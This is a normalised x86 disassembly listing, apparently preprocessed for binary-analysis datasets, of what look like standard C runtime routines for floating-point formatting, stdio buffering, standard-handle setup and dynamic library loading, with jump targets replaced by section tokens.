mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x7ff
push ebx
push esi
xor edx edx
mov ebx [ eax ]
mov esi [ eax + 0x4 ]
mov eax esi
shr eax 0x14
and eax ecx
push edi
cmp eax ecx
jne r-xdata
xor eax eax
cmp edx edx
jne r-xdata
mov edi esi
mov eax ebx
and edi 0xfffff
or eax edi
jne r-xdata
mov ecx esi
mov eax edx
and ecx 0x80000000
or eax ecx
mov eax 0x80000
je r-xdata
inc eax
jmp r-xdata
and esi eax
or edx esi
je r-xdata
cmp ebx edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x3
jmp r-xdata
push 0x2
jmp r-xdata
cmp edi eax
jne r-xdata
pop eax
jmp r-xdata
push 0x4
sub_41af26
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov ecx [ eax + 0x4 ]
mov eax edx
and ecx 0x80000000
or eax ecx
je r-xdata
mov al dl
pop ebp
retn
inc edx
sub_41af44
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
push edi
mov edi [ ebp + 0x1c ]
xor ebx ebx
test edi edi
jns r-xdata
mov esi [ ebp + 0xc ]
lea ecx [ ebp - 0x30 ]
push [ ebp + 0x28 ]
mov [ esi ] bl
call sub_414048
lea eax [ edi + 0xb ]
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov edi ebx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x20 ] eax
mov eax ecx
shr eax 0x14
and eax 0x7ff
cmp eax 0x7ff
jne r-xdata
call sub_41529e
push 0x22
pop edi
mov [ eax ] edi
call sub_413b01
jmp r-xdata
and ecx 0x80000000
mov eax ebx
or eax ecx
je r-xdata
cmp ebx ebx
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov ecx [ edx + 0x4 ]
xor ebx ebx
cmp [ ebp + 0x20 ] bl
push 0x30
sete bl
mov [ ebp - 0xc ] 0x3ff
dec ebx
xor eax eax
and ebx 0xffffffe0
and ecx 0x7ff00000
add ebx 0x27
or eax ecx
mov [ ebp - 0x1c ] ebx
pop eax
jne r-xdata
mov [ esi ] 0x2d
inc esi
push ebx
push [ ebp + 0x24 ]
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
push edx
call sub_41b247
mov edi eax
add esp 0x24
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x30 ]
and [ ecx + 0x350 ] 0xfffffffd
mov [ esi ] 0x31
inc esi
mov [ esi ] al
inc esi
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
and eax 0xfffff
or ecx eax
jne r-xdata
push 0x65
push esi
call sub_429db0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] bl
jmp r-xdata
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov al [ eax ]
mov [ ecx ] al
mov [ ecx ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x3fe
jmp r-xdata
and [ ebp - 0xc ] ecx
jmp r-xdata
mov edi ebx
jmp r-xdata
cmp [ ebp + 0x20 ] bl
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] bl
and [ ebp - 0x4 ] 0x0
mov ecx 0xf0000
push 0x30
pop eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x10 ] ecx
cmp [ edx ] 0x0
jbe r-xdata
mov eax [ edx + 0x4 ]
and eax 0xfffff
mov [ ebp - 0x10 ] eax
ja r-xdata
mov ecx esi
inc esi
mov [ ebp - 0x18 ] ecx
test edi edi
jne r-xdata
test ax ax
js r-xdata
mov eax [ edx ]
mov edx [ edx + 0x4 ]
and eax [ ebp - 0x4 ]
and edx ecx
mov ecx [ ebp - 0x8 ]
and edx 0xfffff
movsx ecx cx
call sub_429b10
push 0x30
pop ecx
add ax cx
movzx eax ax
cmp eax 0x39
jbe r-xdata
test edi edi
jle r-xdata
mov eax [ edx ]
mov edx [ edx + 0x4 ]
and eax [ ebp - 0x4 ]
and edx ecx
mov ecx [ ebp - 0x8 ]
and edx 0xfffff
movsx ecx cx
call sub_429b10
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ esi ] al
inc esi
mov eax [ ebp - 0x4 ]
shrd eax ecx 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
shr ecx 0x4
sub eax 0x4
dec edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] eax
test ax ax
jns r-xdata
add eax ebx
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
push edi
push 0x30
pop eax
push eax
push esi
call sub_411230
add esp 0xc
add esi edi
push 0x30
lea eax [ esi - 0x1 ]
pop ebx
test edi edi
jle r-xdata
cmp [ ebp + 0x20 ] 0x0
mov cl 0x34
mov edx [ ebp + 0x8 ]
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edx ]
mov edx [ edx + 0x4 ]
call sub_429b10
mov ecx eax
xor ebx ebx
and ecx 0x7ff
sub ecx [ ebp - 0xc ]
sbb ebx ebx
js r-xdata
mov esi eax
mov [ eax ] bl
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg ecx
adc ebx 0x0
neg ebx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
mov ebx [ ebp - 0x1c ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp esi edi
jne r-xdata
mov eax 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
test ecx ecx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
push 0x0
push 0xa
push ebx
push ecx
call sub_429b30
add al 0x30
mov [ ebp - 0x1c ] edx
mov [ esi ] al
inc esi
test ebx ebx
jl r-xdata
push 0x0
push eax
push ebx
push ecx
call sub_429b30
add al 0x30
mov [ ebp - 0x1c ] edx
mov [ esi ] al
inc esi
cmp esi edi
jne r-xdata
cmp ecx eax
jb r-xdata
mov edi esi
push 0x30
pop eax
mov [ esi ] al
test ebx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x30
pop eax
add cl al
xor edi edi
mov [ esi ] cl
mov [ esi + 0x1 ] 0x0
jg r-xdata
push 0x0
push 0x64
push ebx
push ecx
call sub_429b30
add al 0x30
mov [ ebp - 0x1c ] edx
mov [ esi ] al
inc esi
test ebx ebx
jl r-xdata
cmp ecx 0xa
jb r-xdata
jg r-xdata
cmp ecx 0x64
jb r-xdata
sub_41b247
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
lea eax [ ebp - 0xc ]
push esi
mov esi [ ebp + 0x1c ]
push edi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
lea edi [ esi + 0x1 ]
push eax
mov eax [ ebp + 0x8 ]
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_424fd4
or ecx 0xffffffff
add esp 0x18
cmp [ ebp + 0x10 ] ecx
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push edi
mov edi [ ebp + 0xc ]
push ecx
xor ecx ecx
cmp [ ebp - 0xc ] 0x2d
sete cl
xor eax eax
test esi esi
setg al
add ecx edi
add eax ecx
push eax
call sub_424eee
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp + 0x10 ]
xor eax eax
cmp [ ebp - 0xc ] 0x2d
sete al
sub ecx eax
xor eax eax
test esi esi
setg al
sub ecx eax
push [ ebp + 0x28 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push [ ebp + 0x10 ]
push edi
call sub_41b2e2
add esp 0x20
mov [ edi ] 0x0
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_41b2e2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi [ ebp + 0x10 ]
test edi edi
jle r-xdata
xor eax eax
mov eax edi
jmp r-xdata
push ebx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
call sub_414048
mov dl [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
test dl dl
je r-xdata
call sub_41529e
push 0x22
pop esi
mov [ eax ] esi
call sub_413b01
mov eax esi
add eax 0x9
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax [ ebp + 0x1c ]
mov esi ebx
cmp [ eax ] 0x2d
jne r-xdata
mov ecx [ ebp + 0x1c ]
xor eax eax
test edi edi
setg al
push eax
xor eax eax
cmp [ ecx ] 0x2d
sete al
add eax ebx
push eax
push [ ebp + 0xc ]
push ebx
call sub_41b751
mov dl [ ebp + 0x20 ]
add esp 0x10
test edi edi
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
test dl dl
sete al
add eax edi
add esi eax
or eax 0xffffffff
cmp [ ebp + 0xc ] eax
je r-xdata
mov al [ esi + 0x1 ]
mov [ esi ] al
inc esi
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
push r--data
push eax
push esi
call sub_414f1a
add esp 0xc
pop ebx
test eax eax
jne r-xdata
mov eax ebx
sub eax esi
add eax [ ebp + 0xc ]
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413b2e
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x14 ] al
je r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ edx + 0x8 ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
cmp [ ebp + 0x18 ] 0x2
jne r-xdata
mov edx [ edx + 0x4 ]
sub edx 0x1
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
push 0x64
pop edi
cmp edx edi
jl r-xdata
neg edx
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x350 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_410380
add esp 0xc
push 0xa
pop edi
cmp edx edi
jl r-xdata
mov eax edx
cdq
idiv edi
add [ esi + 0x2 ] al
pop edi
pop esi
mov esp ebp
pop ebp
retn
add [ esi + 0x4 ] dl
mov eax edx
cdq
idiv edi
add [ esi + 0x3 ] al
sub_41b42d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push esi
push edi
push [ ebp + 0x18 ]
lea edi [ ebp - 0xc ]
push [ ebp + 0x14 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0xc ]
mov edi [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_424fd4
or ecx 0xffffffff
add esp 0x18
cmp [ ebp + 0x10 ] ecx
je r-xdata
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
add eax edi
push eax
xor eax eax
cmp [ ebp - 0xc ] 0x2d
push ecx
sete al
add eax esi
push eax
call sub_424eee
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp + 0x10 ]
xor eax eax
cmp [ ebp - 0xc ] 0x2d
sete al
sub ecx eax
push [ ebp + 0x20 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
push edi
push [ ebp + 0x10 ]
push esi
call sub_41b4ba
add esp 0x18
mov [ esi ] 0x0
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_41b4ba
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push esi
push edi
push [ ebp + 0x1c ]
call sub_414048
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
dec ecx
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ edx ] 0x2d
mov esi ebx
jne r-xdata
cmp ecx edi
jne r-xdata
mov eax [ edx + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edx ] 0x2d
sete al
add eax ecx
mov [ eax + ebx ] 0x30
add esi eax
push 0x1
push esi
push [ ebp + 0xc ]
push ebx
call sub_41b751
add esp 0x10
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
push 0x1
push esi
push [ ebp + 0xc ]
push ebx
call sub_41b751
mov eax [ ebp - 0xc ]
add esp 0x10
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
inc esi
mov eax [ ebp + 0x14 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
jns r-xdata
test edi edi
jle r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
and [ eax + 0x350 ] 0xfffffffd
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov edi ecx
neg edi
mov eax ecx
neg eax
cmp eax edi
jge r-xdata
push edi
push esi
push [ ebp + 0xc ]
push ebx
call sub_41b751
push edi
push 0x30
push esi
call sub_411230
add esp 0x1c
sub_41b591
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x18 ]
xor eax eax
lea edi [ ebp - 0x10 ]
push [ ebp + 0x14 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x10 ]
mov edi [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_424fd4
mov eax [ ebp - 0xc ]
xor ecx ecx
mov ebx [ ebp + 0xc ]
add esp 0x18
cmp [ ebp - 0x10 ] 0x2d
sete cl
dec eax
mov [ ebp - 0x4 ] eax
or eax 0xffffffff
lea esi [ ecx + ebx ]
cmp [ ebp + 0x10 ] eax
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
push edi
push eax
push esi
call sub_424eee
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
sub eax ecx
mov eax [ ebp - 0xc ]
dec eax
cmp [ ebp - 0x4 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ ebx ] 0x0
jmp r-xdata
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push edi
push [ ebp + 0x10 ]
push ebx
call sub_41b2e2
add esp 0x20
cmp eax edi
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test cl cl
je r-xdata
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push edi
push [ ebp + 0x10 ]
push ebx
call sub_41b4ba
add esp 0x18
jmp r-xdata
mov al [ esi ]
inc esi
test al al
jne r-xdata
mov [ esi - 0x2 ] al
sub_41b659
mov edi edi
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push ebx
mov bl [ ebp + 0xc ]
movzx eax bl
add eax 0x4
cmp edx eax
jae r-xdata
test bl bl
je r-xdata
push 0xc
mov [ ecx ] 0x0
pop eax
mov eax r--data
mov [ ebp - 0x24 ] r--data
mov [ ebp - 0x44 ] eax
xor ebx ebx
cmp [ ebp + 0x18 ] bl
mov [ ebp - 0x40 ] eax
mov eax r--data
mov [ ebp - 0x3c ] eax
setne bl
mov [ ebp - 0x38 ] eax
dec ebx
mov eax r--data
mov [ ebp - 0x1c ] r--data
mov [ ebp - 0x2c ] eax
and ebx 0x2
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi r--data
mov [ ebp - 0x14 ] r--data
push edi
lea edi [ eax * 4 - 0x4 ]
mov [ ebp - 0x34 ] esi
lea eax [ edi + ebx ]
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] r--data
mov esi [ ebp + eax * 4 - 0x44 ]
lea eax [ esi + 0x1 ]
mov [ ebp - 0x48 ] eax
mov [ ecx ] 0x2d
inc ecx
dec edx
mov [ ecx ] 0x0
mov al [ esi ]
inc esi
test al al
jne r-xdata
sub esi [ ebp - 0x48 ]
cmp esi edx
sbb eax eax
inc edi
add eax edi
add eax ebx
push [ ebp + eax * 4 - 0x44 ]
push edx
push ecx
call sub_414f1a
add esp 0xc
pop edi
pop esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413b2e
int3
sub_41b751
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0x10 ]
mov ecx esi
push edi
lea edi [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
lea eax [ ecx + 0x1 ]
push eax
lea eax [ esi + edx ]
push esi
push eax
call sub_410380
add esp 0xc
pop edi
pop esi
sub_41b785
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
call sub_41529e
push 0x16
pop esi
mov [ eax ] esi
call sub_413b01
mov eax esi
jmp r-xdata
call sub_41529e
push 0x16
pop esi
mov [ eax ] esi
call sub_413b01
mov eax esi
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
pop ebx
cmp [ ebp + 0x18 ] 0x0
ja r-xdata
mov esi [ ebp + 0x1c ]
cmp esi 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x1
cmp esi 0x45
je r-xdata
mov eax [ ebp + 0x24 ]
and eax 0x10
or eax 0x0
je r-xdata
push [ ebp + 0x8 ]
call sub_41aeba
mov [ ebp - 0x8 ] eax
pop ecx
test eax eax
je r-xdata
cmp esi 0x46
je r-xdata
push 0x2
push 0x3
jmp r-xdata
push [ ebp - 0x4 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_41af26
pop ecx
movzx eax al
push eax
push [ ebp - 0x8 ]
call sub_41b659
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
cmp esi 0x47
jne r-xdata
sub esi 0x65
je r-xdata
pop eax
cmp esi 0x61
jg r-xdata
mov eax [ ebp + 0x24 ]
and eax 0x8
or eax 0x0
jne r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_41b247
sub esi 0x1
je r-xdata
push [ ebp + 0x2c ]
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_41af44
jmp r-xdata
sub esi 0x41
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_41b42d
add esp 0x1c
jmp r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_41b591
jmp r-xdata
add esp 0x24
sub esi 0x4
jmp r-xdata
push [ ebp + 0x2c ]
je r-xdata
sub_41b8cf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
pop ebp
retn
sub_41b90a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_41b8cf
push eax
call sub_426370
pop ecx
pop ecx
test eax eax
jne r-xdata
push ebx
push edi
push 0x1
call sub_416bf9
pop ecx
push 0x2
pop ebx
cmp esi eax
jne r-xdata
xor al al
jmp r-xdata
push ebx
call sub_416bf9
pop ecx
cmp esi eax
jne r-xdata
mov edi rw-data
jmp r-xdata
pop esi
pop ebp
retn
xor al al
mov edi rw-data
inc [ rw-data ]
lea ecx [ esi + 0xc ]
mov eax [ ecx ]
test eax 0x4c0
jne r-xdata
mov eax 0x282
[ ecx ] eax
mov eax [ edi ]
test eax eax
jne r-xdata
mov [ esi + 0x4 ] eax
mov eax [ edi ]
mov [ esi ] eax
mov [ esi + 0x8 ] 0x1000
mov [ esi + 0x18 ] 0x1000
push 0x1000
call sub_419b3e
push 0x0
mov [ edi ] eax
call sub_41a3a5
mov eax [ edi ]
pop ecx
pop ecx
test eax eax
jne r-xdata
pop edi
pop ebx
lea ecx [ esi + 0x14 ]
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ecx
mov [ esi ] ecx
mov [ esi + 0x18 ] ebx
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41b9bf
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
push edi
lea edi [ esi + 0xc ]
mov eax [ edi ]
shr eax 0x9
test al 0x1
je r-xdata
pop edi
pop esi
push esi
call sub_416178
pop ecx
mov eax 0xfffffd7f
[ edi ] eax
xor eax eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
sub_41b9f8
mov edi edi
push ebp
mov ebp esp
sub esp 0x48
lea eax [ ebp - 0x48 ]
push eax
call [ GetStartupInfoW@IAT ]
cmp [ ebp - 0x16 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
push ebx
push esi
mov esi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + esi ]
mov [ ebp - 0x4 ] eax
mov eax 0x2000
cmp esi eax
jl r-xdata
push esi
call sub_41f881
mov eax [ rw-data ]
pop ecx
cmp esi eax
jle r-xdata
mov esi eax
push edi
xor edi edi
test esi esi
je r-xdata
mov esi eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x4 ]
inc edi
add eax 0x4
inc ebx
mov [ ebp - 0x4 ] eax
cmp edi esi
jne r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
mov dl [ ebx ]
test dl 0x1
je r-xdata
test dl 0x8
jne r-xdata
mov eax edi
mov ecx edi
and eax 0x3f
sar ecx 0x6
imul edx eax 0x30
mov eax [ ebp - 0x4 ]
add edx [ ecx * 4 + rw-data ]
mov eax [ eax ]
mov [ edx + 0x18 ] eax
mov al [ ebx ]
mov [ edx + 0x28 ] al
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
sub_41baae
mov edi edi
push ebx
push esi
push edi
xor edi edi
mov eax edi
mov [ esi + 0x28 ] 0x81
sub eax 0x0
je r-xdata
cmp [ esi + 0x18 ] 0xfffffffe
je r-xdata
push 0xfffffff6
sub eax 0x1
je r-xdata
or [ esi + 0x28 ] 0x80
jmp r-xdata
xor eax eax
test ebx ebx
je r-xdata
push 0xfffffff5
jmp r-xdata
push 0xfffffff4
sub eax 0x1
jmp r-xdata
inc edi
cmp edi 0x3
jne r-xdata
or [ esi + 0x28 ] 0x40
mov [ esi + 0x18 ] 0xfffffffe
mov eax [ rw-data ]
test eax eax
je r-xdata
and eax 0xff
mov [ esi + 0x18 ] ebx
cmp eax 0x2
jne r-xdata
push ebx
call [ GetFileType@IAT ]
jmp r-xdata
pop eax
push eax
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov eax edi
mov ecx edi
and eax 0x3f
sar ecx 0x6
imul esi eax 0x30
add esi [ ecx * 4 + rw-data ]
cmp [ esi + 0x18 ] 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + edi * 4 ]
mov [ eax + 0x10 ] 0xfffffffe
cmp eax 0x3
jne r-xdata
or [ esi + 0x28 ] 0x40
jmp r-xdata
test eax eax
je r-xdata
or [ esi + 0x28 ] 0x8
jmp r-xdata
sub_41bb64
push 0xc
push r--data
call sub_40e2a0
push 0x7
call sub_4191c3
pop ecx
xor ebx ebx
mov [ ebp - 0x19 ] bl
mov [ ebp - 0x4 ] ebx
push ebx
call sub_41f881
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41bbb1
mov al bl
call sub_40e2e6
retn
call sub_41b9f8
call sub_41baae
mov bl 0x1
mov [ ebp - 0x19 ] bl
sub_41bbba
mov edi edi
push esi
xor esi esi
add esi 0x4
cmp esi 0x200
jb r-xdata
push eax
call sub_41f84c
and [ esi + rw-data ] 0x0
pop ecx
mov eax [ esi + rw-data ]
test eax eax
je r-xdata
mov al 0x1
pop esi
retn
sub_41bbe6
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ rw-data ]
mov ecx esi
xor esi [ rw-data ]
and ecx 0x1f
push 0x0
push 0x0
push [ ebp + 0x8 ]
ror esi cl
mov ecx esi
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0x4
sub_41bc2c
push 0xc
push r--data
call sub_40e2a0
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
push [ eax ]
call sub_417c8d
pop ecx
mov [ rw-data ] eax
push 0x1
push sub_41bbe6
call [ EnumSystemLocalesW@IAT ]
mov esi eax
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
mov [ rw-data ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41bca4
mov eax esi
call sub_40e2e6
retn 0xc
sub_41bcb0
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_41bc2c
mov esp ebp
pop ebp
retn
sub_41bcf2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
mov edx [ rw-data ]
or edi 0xffffffff
mov ecx edx
mov esi edx
and ecx 0x1f
xor esi eax
ror esi cl
cmp esi edi
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov esi [ ebp + 0x10 ]
cmp esi [ ebp + 0x14 ]
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
push [ esi ]
call sub_41bd8e
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax edx
push 0x20
and eax 0x1f
pop ecx
sub ecx eax
ror edi cl
xor edi edx
xchg [ ebx ] edi
push [ ebp + 0xc ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
add esi 0x4
cmp esi [ ebp + 0x14 ]
jne r-xdata
mov edx [ rw-data ]
push esi
call sub_410c5a
pop ecx
xchg [ ebx ] eax
jmp r-xdata
test eax eax
je r-xdata
mov edx [ rw-data ]
sub_41bd8e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push edi
lea edi [ eax * 4 + rw-data ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
push ebx
mov ebx [ eax * 4 + r--data ]
push esi
push 0x800
push 0x0
push ebx
call [ LoadLibraryExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
neg eax
sbb eax eax
and eax ecx
jmp r-xdata
mov eax esi
xchg [ edi ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
pop edi
pop ebp
retn
mov eax esi
push esi
call [ FreeLibrary@IAT ]
xor esi esi
push esi
push esi
push ebx
call [ LoadLibraryExW@IAT ]
mov esi eax
jmp r-xdata
or eax 0xffffffff
xchg [ edi ] eax
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
pop esi
pop ebx
sub_41be09
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x0
call sub_41bcf2
mov esi eax
add esp 0x10
test esi esi
je r-xdata
xor eax eax
inc eax
mov ecx esi
